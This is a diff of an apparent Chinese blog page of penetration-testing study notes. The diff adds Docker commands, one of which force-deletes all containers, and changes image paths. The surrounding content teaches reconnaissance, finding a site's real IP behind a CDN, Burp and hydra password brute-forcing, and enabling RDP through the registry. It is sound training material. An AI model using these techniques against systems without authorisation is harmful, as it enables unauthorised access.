@@ -5,11 +5,10 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="wwqstudy">
-    <meta name="description" content="信息收集1信息收集——渗透测试的灵魂
-为什么要信息收集？
-有句话说“知己知彼，百战不殆”。最了解你的人往往都是你的对手。
-当你所掌握到的信息比别人多且更详细的时候那么你就占据了先机，这一条不仅仅用于商业、战争、渗透测试中也适用。
-信息收集的">
+    <meta name="description" content="docker使用docker ps //查看开启容器情况
+docker rm -f $(docker ps -qa) //删除所有已开启容器
+docker exec -it 容器编号 /bin/sh //进入容器环境
+bash -i //容">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -455,14 +454,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    21.3k
+                    31.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    88 分
+                    133 分
                 </div>
                 
 
@@ -485,7 +484,13 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="信息收集1"><a href="#信息收集1" class="headerlink" title="信息收集1"></a>信息收集1</h2><p>信息收集——渗透测试的灵魂</p>
+                <h2 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">docker ps <span class="token comment">//查看开启容器情况</span>
+docker rm <span class="token operator">-</span><span class="token class-name type-declaration">f</span> $<span class="token punctuation">(</span>docker ps <span class="token operator">-</span>qa<span class="token punctuation">)</span> <span class="token comment">//删除所有已开启容器</span>
+docker exec <span class="token operator">-</span>it 容器编号 <span class="token operator">/</span>bin<span class="token operator">/</span>sh <span class="token comment">//进入容器环境</span>
+bash <span class="token operator">-</span>i <span class="token comment">//容器快捷操作</span>
+find <span class="token operator">/</span> <span class="token operator">-</span>name 文件名 <span class="token comment">//查找指定文件路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="信息收集1"><a href="#信息收集1" class="headerlink" title="信息收集1"></a>信息收集1</h2><p>信息收集——渗透测试的灵魂</p>
 <p>为什么要信息收集？</p>
 <p>有句话说“知己知彼，百战不殆”。最了解你的人往往都是你的对手。</p>
 <p>当你所掌握到的信息比别人多且更详细的时候那么你就占据了先机，这一条不仅仅用于商业、战争、渗透测试中也适用。</p>
@@ -500,7 +505,7 @@
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ping secdriver.com  # ping DNS解析
 nslookup secdriver.com  # nslookup DNS解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/01220/1.PNG" alt=" "></p>
+<p><img src="/2023/01221/1.PNG" alt=" "></p>
 <h4 id="域名级别"><a href="#域名级别" class="headerlink" title="域名级别"></a><strong>域名级别</strong></h4><p>域名可分为不同级别，包括顶级域名、二级域名等</p>
 <h5 id="顶级域名"><a href="#顶级域名" class="headerlink" title="顶级域名"></a><strong>顶级域名</strong></h5><p><strong>国家顶级域名</strong>（national top-level domainnames，简称nTLDs），200多个国家都按照ISO3166国家代码分配了顶级域名，例如中国是 .cn，美国是 .us，日本是 .jp 等</p>
 <p><strong>国际顶级域名</strong>（international top-level domain names，简称iTDs），例如表示工商企业的 .com，表示网络提供商的 .net，表示顶级标杆、个人的 .top，表示非盈利组织的.org等</p>
@@ -540,14 +545,14 @@ ctf.secdriver.com
 <h5 id="网站查询子域名"><a href="#网站查询子域名" class="headerlink" title="网站查询子域名"></a><strong>网站查询子域名</strong></h5><p>VirusTotal <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></p>
 <p>fofa <a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a></p>
 <h5 id="工具扫描"><a href="#工具扫描" class="headerlink" title="工具扫描"></a><strong>工具扫描</strong></h5><p>Layer子域名挖掘机</p>
-<p><img src="/2023/01220/4.PNG" alt="4"></p>
+<p><img src="/2023/01221/4.PNG" alt="4"></p>
 <h3 id="2-端口信息"><a href="#2-端口信息" class="headerlink" title="2.端口信息"></a><strong>2.端口信息</strong></h3><p>计算机“端口”是英文port的义译，可以认为是计算机与外界通讯交流的出口，计算机有0~65535，共计65536个端口。</p>
 <p>端口作为服务器和客户端交互的接口，起着非常重要的作用。一些常见的端口标识出服务器开启了什么服务，比如3389端口开启，可以认为服务器系统为windows并且开启了远程服务的功能。所以，端口扫描在渗透测试中是非常重要的。</p>
-<h4 id="插件探测"><a href="#插件探测" class="headerlink" title="插件探测"></a><strong>插件探测</strong></h4><h5 id="Fofa-Pro-view"><a href="#Fofa-Pro-view" class="headerlink" title="Fofa Pro view"></a><strong>Fofa Pro view</strong></h5><p><img src="/2023/01220/5.png" alt="5"></p>
-<h5 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a><strong>shodan</strong></h5><p><img src="/2023/01220/6.png" alt="6"></p>
+<h4 id="插件探测"><a href="#插件探测" class="headerlink" title="插件探测"></a><strong>插件探测</strong></h4><h5 id="Fofa-Pro-view"><a href="#Fofa-Pro-view" class="headerlink" title="Fofa Pro view"></a><strong>Fofa Pro view</strong></h5><p><img src="/2023/01221/5.png" alt="5"></p>
+<h5 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a><strong>shodan</strong></h5><p><img src="/2023/01221/6.png" alt="6"></p>
 <h4 id="工具扫描-1"><a href="#工具扫描-1" class="headerlink" title="工具扫描"></a><strong>工具扫描</strong></h4><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h5><p>nmap 是一款开源免费的针对大型网络的端口扫描工具，nmap可以检测目标主机是否在线、主机端口开放情况、检测主机运行的服务类型及版本信息、检测操作系统与设备类型等信息</p>
 <p>nmap常用参数</p>
-<p><img src="/2023/01220/2.PNG" alt="2"></p>
+<p><img src="/2023/01221/2.PNG" alt="2"></p>
 <h6 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a><strong>基本使用</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap 192.168.23.1  # Nmap 默认发送⼀个arp的ping数据包，来探测⽬标主机在1-10000范围内所开放的端⼝<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
@@ -580,7 +585,7 @@ firefox mysite.html<span aria-hidden="true" class="line-numbers-rows"><span></sp
 
 <h5 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a><strong>masscan</strong></h5><p>masscan 是 Kali 下集成的高效扫描器 , 速度非常快</p>
 <p>masscan 常用参数</p>
-<p><img src="/2023/01220/3.PNG" alt="3"></p>
+<p><img src="/2023/01221/3.PNG" alt="3"></p>
 <h6 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a><strong>基本用法</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">masscan 192.168.23.1 -p 1-3000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h6 id="枚举C段"><a href="#枚举C段" class="headerlink" title="枚举C段"></a><strong>枚举C段</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-sL 参数可以枚举网段
@@ -618,9 +623,9 @@ masscan 192.168.23.1&#x2F;24 -p
 <li><p>发现敏感文件，后台文件，数据库文件，和信息泄漏文件等等</p>
 </li>
 </ul>
-<h4 id="常见的后台管理页面："><a href="#常见的后台管理页面：" class="headerlink" title="常见的后台管理页面："></a>常见的后台管理页面：</h4><p><img src="/2023/01220/7.PNG" alt="7"></p>
+<h4 id="常见的后台管理页面："><a href="#常见的后台管理页面：" class="headerlink" title="常见的后台管理页面："></a>常见的后台管理页面：</h4><p><img src="/2023/01221/7.PNG" alt="7"></p>
 <h4 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h4><p>Robots协议(Robots Exclusion Protocol)“网络爬虫排除标准”，网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，同时也记录网站所具有基本的目录</p>
-<p><img src="/2023/01220/8.PNG" alt="8"></p>
+<p><img src="/2023/01221/8.PNG" alt="8"></p>
 <h3 id="目录扫描工具"><a href="#目录扫描工具" class="headerlink" title="目录扫描工具"></a>目录扫描工具</h3><h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>dirsearch是一个基于python3的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件</p>
 <p>依赖安装： pip install -r requirements.txt</p>
 <p>简单使用：python dirsearch.py -u 目标地址</p>
@@ -684,11 +689,11 @@ masscan 192.168.23.1&#x2F;24 -p
 <h4 id="在线指纹识别："><a href="#在线指纹识别：" class="headerlink" title="在线指纹识别："></a>在线指纹识别：</h4><p><a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p>
 <p><a target="_blank" rel="noopener" href="http://pentest.gdpcisa.org/whatcms">http://pentest.gdpcisa.org/whatcms</a></p>
 <h5 id="指纹探测插件：Wapplyzer"><a href="#指纹探测插件：Wapplyzer" class="headerlink" title="指纹探测插件：Wapplyzer"></a>指纹探测插件：Wapplyzer</h5><h4 id="CDN识别"><a href="#CDN识别" class="headerlink" title="CDN识别"></a>CDN识别</h4><h5 id="认识CDN"><a href="#认识CDN" class="headerlink" title="认识CDN"></a>认识CDN</h5><p>CDN是指内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器。</p>
-<p><img src="/2023/01220/9.PNG" alt="9"></p>
+<p><img src="/2023/01221/9.PNG" alt="9"></p>
 <p>通过中心平台的负载均衡内容分发，调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p>
 <p>CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络内。</p>
 <p>在用户访问网站时，利用全局负载技术将用户的访问<strong>指向距离最近的工作正常的缓存服务器上</strong>，由缓存服务器直接响应用户请求。</p>
-<p><img src="/2023/01220/10.PNG" alt="10"></p>
+<p><img src="/2023/01221/10.PNG" alt="10"></p>
 <h5 id="识别CDN"><a href="#识别CDN" class="headerlink" title="识别CDN"></a>识别CDN</h5><p>nslookup</p>
 <p>多地ping网站：<a target="_blank" rel="noopener" href="https://ping.chinaz.com/">https://ping.chinaz.com/</a> <a target="_blank" rel="noopener" href="https://tools.ipip.net/ping.php">https://tools.ipip.net/ping.php</a></p>
 <p>在线识别：<a target="_blank" rel="noopener" href="https://www.cdnplanet.com/tools/cdnfinder">https://www.cdnplanet.com/tools/cdnfinder</a></p>
@@ -718,28 +723,28 @@ region&#x3D;&quot;Henan&quot;   # 搜索指定行政区的资产<span aria-hidd
 <h4 id="google语法"><a href="#google语法" class="headerlink" title="google语法"></a>google语法</h4><p>基本语法</p>
 <p><strong>AND：缺一不可</strong></p>
 <p>谷歌的默认搜索是and逻辑，意思就是，我们在输入关键字后进行搜索时，如输入：“program google”后，会搜出包含“program”和“google”的文件内容，如图</p>
-<p><img src="/2023/01220/11.PNG" alt="11"></p>
+<p><img src="/2023/01221/11.PNG" alt="11"></p>
 <p>基础布尔逻辑</p>
 <p>对于一个搜索引擎来说，进行搜索的时候是要搜索到匹配到所有关键词的页面，还是包含关键词中的任意关键词就可以，取决于一个搜索引擎的一些特别算法，称之为搜索引擎的布尔逻辑默认值。</p>
 <p><strong>OR：两者皆可</strong></p>
 <p>而google就是用and作为默认逻辑（搜索到所有的关键词），当然这个前提是我们没有输入一些特殊的命令。如果你不确定你要搜索的内容，或者你想搜索两个中的任意一个，那么就要使用关键词“OR”。注意：OR是大写的，小写是不起作用的，而且，每一个关键词与“OR”之间是有一个空格的，我们来看一下搜索结果。</p>
-<p><img src="/2023/01220/12.PNG" alt="12"></p>
+<p><img src="/2023/01221/12.PNG" alt="12"></p>
 <p>当然，可以预想的是，google的结果要比program多得多，所以结果第一页全是有关google的内容。此外，还可以借助计算机体系语言中的“|”来代替“OR”，效果是一样的。</p>
 <p><strong>“”</strong> <strong>：一刻都不能分割</strong></p>
 <p>当然，如果你希望搜索“programgoogle”的内容，而不希望这两个单词之间有任何其他的内容，那么就要使用双引号把搜索的内容组成一个词组”programgoogle”来达到目的。如图所示。</p>
-<p><img src="/2023/01220/13.PNG" alt="13"></p>
+<p><img src="/2023/01221/13.PNG" alt="13"></p>
 <p>如上图所示，结果中的programgoogle都是在一起的，没有分割。当然这样的结果比较少，只有2740个，但是看图1，结果却有7亿多个。而且，大部分搜索引擎都有智能断句的功能，如果没有特殊的命令，搜索引擎会一定量的根据大众的语言使用习惯来判断你要搜索什么，而这样的做法，不仅仅没有使搜索引擎显得不听话，反而对大众来讲搜索引擎变得十分智能和高效！</p>
 <p><strong>-</strong> <strong>：不想看到你</strong></p>
 <p>但是如果我们只想看到“program”的内容，而不希望看到“google”的内容，就可以把“-”（减号或者破折号）应用到搜索当中去，语法为“program -google”，注意，“-”之前是有一个空格的，而其后却是和下一个关键词是紧紧相连的！搜索的结果如下图4所示。可以看得到结果中都会包含program，而不包含google</p>
-<p><img src="/2023/01220/14.PNG" alt="14"></p>
+<p><img src="/2023/01221/14.PNG" alt="14"></p>
 <p><strong>+</strong> <strong>：就想看到你</strong></p>
 <p>说到这里，还要提一下google的约束扩展问题了。一般来说，当输入关键词后，google会把相关网页和信息的结果呈现在我们面前。然而，有一些单词在搜索引擎中是会被智能忽略的，导致我们得不到想要的结果。比如十分常用的“www”和“the”，基本上任何一个网页上都会找到的东西，就会被google自动忽略（不要觉得这样不好，还是那个道理，在实际引用当中这样做反而显得更加高效和智能）。如果我们不想忽略这些词进行查询，就得在这些关键词的前面加上符号“+”。如下图5所示：</p>
 <p>看上去两者好像没有什么大的区别，其实仔细比较一下搜索结果就可以看得出，加上加号的搜索结果有一万多个，而不加加号的结果却有着55亿多！而因为google和www的关联度比较高，所以在前面的结果表现的差别不大。</p>
-<p><img src="/2023/01220/15.PNG" alt="15"></p>
+<p><img src="/2023/01221/15.PNG" alt="15"></p>
 <p><strong>“?”和“*” ：占位通配符</strong></p>
 <p>除了上述字符之外，一些搜索引擎支持一种叫做“stemming”（填充）的技术。Stemming是指在查询的关键词中添加一些通配符，通常是“<em>”，有时候也可能是“？”，这些通配符的作用是要求搜索引擎进行查询是可以返回多个不同的结果。其中通配符代表占位，可以匹配其他任意字母和单词，而其他的字或词组与用户输入的相同。如我们想要搜索“Lionel Messi”的内容，却忘记了第一个单词的一些拼写，就可以输入“”l</em>Messi””进行查询，注意：此处整个字符串是要用一个英文半角双引号括住的！结果如下图所示。　</p>
 <p>可以看到，google自动匹配出Lionel Messi的内容并且进行了搜索。这样的方式有利于我们只能记住单词或短语的一部分的内容时使用。</p>
-<p><img src="/2023/01220/16.PNG" alt="16"></p>
+<p><img src="/2023/01221/16.PNG" alt="16"></p>
 <p><strong>特殊语法</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">site：可以限制你搜索范围的域名；
 inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用；
@@ -781,13 +786,13 @@ ip: 查找特点ip的网站<span aria-hidden="true" class="line-numbers-rows"><s
 
 <h2 id="CDN识别-amp-amp-绕过"><a href="#CDN识别-amp-amp-绕过" class="headerlink" title="CDN识别&amp;&amp;绕过"></a>CDN识别&amp;&amp;绕过</h2><p>CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。</p>
 <h3 id="CDN识别-1"><a href="#CDN识别-1" class="headerlink" title="CDN识别"></a>CDN识别</h3><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>GET 请求页面/文件地址，查看 HTTP 响应头中是否存在 “cache xxx” 的值，若存在，则表示有走 CDN。</p>
-<p><img src="/2023/01220/17.PNG" alt="17"></p>
+<p><img src="/2023/01221/17.PNG" alt="17"></p>
 <h4 id="ping域名"><a href="#ping域名" class="headerlink" title="ping域名"></a>ping域名</h4><p>ping 域名，查看 ping 的实际地址，若实际地址为 CDN 节点地址，则表示有走 CDN。</p>
-<p><img src="/2023/01220/18.PNG" alt="18"></p>
+<p><img src="/2023/01221/18.PNG" alt="18"></p>
 <h4 id="nslookup解析"><a href="#nslookup解析" class="headerlink" title="nslookup解析"></a>nslookup解析</h4><p>nslookup 域名，若解析结果有多个，很有可能存在CDN，相反，若解析结果只有一个，可能不存在CDN(不能肯定)。</p>
-<p><img src="/2023/01220/19.PNG" alt="19"></p>
+<p><img src="/2023/01221/19.PNG" alt="19"></p>
 <h4 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h4><p>利用多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致， 如果都是一样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。</p>
-<p><img src="/2023/01220/20.PNG" alt="20"></p>
+<p><img src="/2023/01221/20.PNG" alt="20"></p>
 <h3 id="CDN厂商"><a href="#CDN厂商" class="headerlink" title="CDN厂商"></a>CDN厂商</h3><h4 id="CDN厂商识别"><a href="#CDN厂商识别" class="headerlink" title="CDN厂商识别"></a>CDN厂商识别</h4><p><a target="_blank" rel="noopener" href="https://www.cdnplanet.com/tools/cdnfinder/#">https://www.cdnplanet.com/tools/cdnfinder/#</a></p>
 <p><a target="_blank" rel="noopener" href="http://tools.bugscaner.com/whichcdn/">http://tools.bugscaner.com/whichcdn/</a></p>
 <p>国外厂商：CloudFlare、StackPath、Fastly、CDNetworks、CacheFly、CloudFront</p>
@@ -821,7 +826,7 @@ favicon <span class="token operator">=</span> base64<span class="token punctuati
 <p>安装指定依赖包: pip install mmh3-3.0.0-cp39-cp39-win_amd64.whl </p>
 <p><strong>第二种</strong>（不推荐，vs2019非常大）：</p>
 <p>安装vs2019 下载组件 C++ ATL v141 </p>
-<p><img src="/2023/01220/21.PNG" alt="21"></p>
+<p><img src="/2023/01221/21.PNG" alt="21"></p>
 <p>然后 pip install mmh3 即可成功安装</p>
 <h4 id="工具扫描全网"><a href="#工具扫描全网" class="headerlink" title="工具扫描全网"></a>工具扫描全网</h4><p>扫描全网开放特定端口的IP，然后获取他们的特定页面的HTM源代码，用这些源代码和目标网站的特定页面的HTM源代码做对比，如果匹配上来了，就很可能是目标网站的真实P，工具匹配会匹配出来很多，最后还是要人工筛选。</p>
 <p><strong>zmap扫描全网</strong></p>
@@ -886,33 +891,33 @@ if($username &#x3D;&#x3D; &#39;admin&#39; &amp;&amp; $password &#x3D;&#x3D; &#39
 <p>3.服务器端程序返回一个带签名的token 给客户端。</p>
 <p>4.客户端储存token,并且每次访问API都携带Token到服务器端的。</p>
 <p>5.服务端验证token，校验成功则返回请求数据，校验失败则返回错误码。</p>
-<p><img src="/2023/01220/22.PNG" alt="22"></p>
+<p><img src="/2023/01221/22.PNG" alt="22"></p>
 <p><strong>简单示例：</strong></p>
 <ol>
 <li>burp抓包发送到intruder,爆破模式选择Pitchfork</li>
 </ol>
-<p><img src="/2023/01220/25.PNG" alt="25"></p>
+<p><img src="/2023/01221/25.PNG" alt="25"></p>
 <ol start="2">
 <li>payloads中第二个数据选择Recursive grep</li>
 </ol>
-<p><img src="/2023/01220/26.PNG" alt="26"></p>
+<p><img src="/2023/01221/26.PNG" alt="26"></p>
 <ol start="3">
 <li>在Resourse Pool模块下的线程要调为1，因为一个token只能一时间产生一个</li>
 </ol>
-<p><img src="/2023/01220/27.PNG" alt="27"></p>
+<p><img src="/2023/01221/27.PNG" alt="27"></p>
 <ol start="4">
 <li>Options模块的Grep-Extract模式里添加token，有的token重复刷新会界面302获取不了，记得更换新的token</li>
 </ol>
-<p><img src="/2023/01220/28.PNG" alt="28"></p>
+<p><img src="/2023/01221/28.PNG" alt="28"></p>
 <ol start="5">
 <li>回到payloads模块加一新的token</li>
 </ol>
-<p><img src="/2023/01220/28.PNG" alt="28"></p>
+<p><img src="/2023/01221/28.PNG" alt="28"></p>
 <ol start="6">
 <li>爆破，找出正确密码</li>
 </ol>
 <h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><p>basic认证（基本认证）是从http/1.0就定义的认证方式。即使是如今仍有一部分的网站会使用这种认证方式。</p>
-<p><img src="/2023/01220/23.PNG" alt="23"></p>
+<p><img src="/2023/01221/23.PNG" alt="23"></p>
 <h4 id="Basic认证过程"><a href="#Basic认证过程" class="headerlink" title="Basic认证过程"></a>Basic认证过程</h4><p><strong>步骤1</strong> ：当请求的资源须要BASIC认证时，服务器会随状态码401Authorization Requireed，返回带WWW-Authenticate首部字段的响应。该字段内包含认证的方式（BASIC）及 Request-URI安全域字符串（realm）安全</p>
 <p><strong>步骤2</strong> ：接收到状态码401的客户端为了经过BASIC认证，须要将用户ID及密码发送给服务器。发送的字符串内容是由用户ID和密码构成，二者中间以(:)链接后，在通过Base64编码处理。服务器假设用户ID为guest，密码是guest，链接起来就会造成guest：guest这样的字符串。而后通过base64编</p>
 <p>码，最后结果是 Z3VLc3Q6Z3Vlc3Q=。把这串字符串写入首部字段Authrization以后发送请求。网站当用户代理为浏览器时，用户仅输入用户ID和密码便可，以后，浏览器会自动完成到base64编码的转换工作</p>
@@ -1040,7 +1045,7 @@ print(&quot;运行结束~！&quot;)<span aria-hidden="true" class="line-numbers-
 <h2 id="暴力破解2"><a href="#暴力破解2" class="headerlink" title="暴力破解2"></a>暴力破解2</h2><h3 id="CS架构破解"><a href="#CS架构破解" class="headerlink" title="CS架构破解"></a>CS架构破解</h3><p>B/S架构即 Brouser/Server ，是一种浏览器和服务器架构模式；CS架构是指服务器-客户机。服务器-客户机，即Client/Server(C/S)结构。</p>
 <h4 id="hydra爆破工具"><a href="#hydra爆破工具" class="headerlink" title="hydra爆破工具"></a>hydra爆破工具</h4><p>hydra 可以爆破 ftp / ssh / telnet / mysql / rdp 等各种服务。</p>
 <p>常用参数</p>
-<p><img src="/2023/01220/24.PNG" alt="24"></p>
+<p><img src="/2023/01221/24.PNG" alt="24"></p>
 <h5 id="学习平台实操"><a href="#学习平台实操" class="headerlink" title="学习平台实操"></a>学习平台实操</h5><p>登陆vpn访问学习平台：<a target="_blank" rel="noopener" href="https://edu.work.ltsec.com/index">https://edu.work.ltsec.com/index</a> 访问暴力穷举破解进行练习</p>
 <h5 id="mysql开启远程登录"><a href="#mysql开启远程登录" class="headerlink" title="mysql开启远程登录"></a>mysql开启远程登录</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">登陆mysql
 use &#96;mysql&#96;;
@@ -1101,9 +1106,9 @@ fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" c
 <h4 id="验证码可穷举"><a href="#验证码可穷举" class="headerlink" title="验证码可穷举"></a>验证码可穷举</h4><p>有的验证码不是使用算法随机生成的，而是一些固定的图片，多刷新几次验证码我们可能会发现系统中的存在就那么一些验证码，这种情况这种情况下只要将验证码全部下载下来，生成一个md5库，然后将前端生成的验证码与本地文件进行对比即可。</p>
 <p>思路：建立图片md5库 与 对应验证码值库后，用 resquest.Session() 建立一个可保持状态的request对象，下载验证码图片后与md5库对比得出验证码值，进行登陆爆破即可。</p>
 <h2 id="暴力破解与加密"><a href="#暴力破解与加密" class="headerlink" title="暴力破解与加密"></a>暴力破解与加密</h2><h3 id="Debug代码调试"><a href="#Debug代码调试" class="headerlink" title="Debug代码调试"></a>Debug代码调试</h3><p>Debug的意义在于发现程序错误的存在以隔离、消除等方式对错误，进行定位确定错误产生的原因，提出纠正错误的解决办法，对程序错误予以改正</p>
-<h4 id="vscode-debug-python"><a href="#vscode-debug-python" class="headerlink" title="vscode debug python"></a>vscode debug python</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><h6 id="1-安装插件python"><a href="#1-安装插件python" class="headerlink" title="1.安装插件python"></a>1.安装插件python</h6><p><img src="/2023/01220/30.PNG" alt="30"></p>
+<h4 id="vscode-debug-python"><a href="#vscode-debug-python" class="headerlink" title="vscode debug python"></a>vscode debug python</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><h6 id="1-安装插件python"><a href="#1-安装插件python" class="headerlink" title="1.安装插件python"></a>1.安装插件python</h6><p><img src="/2023/01221/30.PNG" alt="30"></p>
 <h6 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a>2.配置文件</h6><p>vscdoe会在每个文件夹下创建一个 .vscode 的配置文件目录 ， 在其中创建 <strong>launch.json 、tasks.json</strong></p>
-<p><img src="/2023/01220/31.PNG" alt="31"></p>
+<p><img src="/2023/01221/31.PNG" alt="31"></p>
 <p><strong>lanuch.json</strong></p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#123;
     &#x2F;&#x2F; 使用 IntelliSense 了解相关属性。
@@ -1149,9 +1154,9 @@ fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" c
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h6 id="修改python解释器"><a href="#修改python解释器" class="headerlink" title="修改python解释器"></a>修改python解释器</h6><p>vscode中Ctrl+shirt+p调出查询窗口，输入python:select选择python解释器</p>
-<p><img src="/2023/01220/32.PNG" alt="32"></p>
+<p><img src="/2023/01221/32.PNG" alt="32"></p>
 <h5 id="Debug-Start"><a href="#Debug-Start" class="headerlink" title="Debug Start"></a>Debug Start</h5><p>使用debug模式启动程序代码</p>
-<p><img src="/2023/01220/33.PNG" alt="33"></p>
+<p><img src="/2023/01221/33.PNG" alt="33"></p>
 <h6 id="1-下断点debug"><a href="#1-下断点debug" class="headerlink" title="1.下断点debug"></a>1.下断点debug</h6><p>在想要调试的代码处下断点，程序debug运行后会停在此行代码执行前，等待用户调试。</p>
 <h6 id="2-调试选项"><a href="#2-调试选项" class="headerlink" title="2.调试选项"></a>2.调试选项</h6><p><strong>继续</strong>：继续执行程序，直到遇到下一个断点为止</p>
 <p><strong>单步跳过</strong>：在普通代码行运行时，会逐行运行程序。若遇到调用自定义函数命令，且在该定义的函数里没有断点，则直接运行完该函数，不会进入该函数并逐行运行该函数内的代码</p>
@@ -1160,7 +1165,7 @@ fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" c
 <p><strong>重启</strong>：重新启动debug程序</p>
 <p><strong>停止</strong>：结束程序</p>
 <h6 id="3-变量监视"><a href="#3-变量监视" class="headerlink" title="3.变量监视"></a>3.变量监视</h6><p>一般在不进行 debug 时会使用print打印某个变量的值，debug可以很轻松的监视每个变量的值。</p>
-<p><img src="/2023/01220/34.png" alt="34"></p>
+<p><img src="/2023/01221/34.png" alt="34"></p>
 <h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><p>在我们渗透过程在，经常会发现没有验证码，也没有登录次数限制，但是用户名密码都是加密的，如果只是md5加密或者hash，burp的Intruder模块自带加密爆破功能，但是如果是自定义的加密方式，或者多层md5此时就没法直接爆破了。这种情况都是前端调用 javascript代码对提交内容进行了加密，通过代码调试可以找到加密函数，使用与其相同的加密函数处理数据提交即可。</p>
 <h4 id="常见前端加密"><a href="#常见前端加密" class="headerlink" title="常见前端加密"></a>常见前端加密</h4><h5 id="base64加密与解密"><a href="#base64加密与解密" class="headerlink" title="base64加密与解密"></a>base64加密与解密</h5><p>window.atob() 与window.btoa()可以实现对base64格式的数据进行解码和编码，其兼容性是主流浏览器，IE10及以上。</p>
 <p>window.atob(encodedStr)只可以解码用btoa方法编码的字符串。</p>
@@ -1251,9 +1256,9 @@ $.ajax(&#123;
 <p>统读写文件等。PhantomJS的用处可谓非常广泛，诸如网络监测、网页截</p>
 <p>屏、无需浏览器的 Web 测试、页面访问自动化等</p>
 <p><strong>配置：</strong>下载 <a target="_blank" rel="noopener" href="https://phantomjs.org/download.html">phantomjs</a>将 bin 目录<strong>添加至环境变量</strong>即可</p>
-<p><img src="/2023/01220/36.PNG" alt="36"></p>
+<p><img src="/2023/01221/36.PNG" alt="36"></p>
 <h6 id="2-安装jsEncrypter"><a href="#2-安装jsEncrypter" class="headerlink" title="2.安装jsEncrypter"></a>2.安装jsEncrypter</h6><p> <a target="_blank" rel="noopener" href="https://github.com/c0ny1/jsEncrypter/releases">下载jsEncrypter</a></p>
-<h6 id="3-burp导入插件jsEncrypter"><a href="#3-burp导入插件jsEncrypter" class="headerlink" title="3.burp导入插件jsEncrypter"></a>3.burp导入插件jsEncrypter</h6><p><img src="/2023/01220/37.png" alt="37"></p>
+<h6 id="3-burp导入插件jsEncrypter"><a href="#3-burp导入插件jsEncrypter" class="headerlink" title="3.burp导入插件jsEncrypter"></a>3.burp导入插件jsEncrypter</h6><p><img src="/2023/01221/37.png" alt="37"></p>
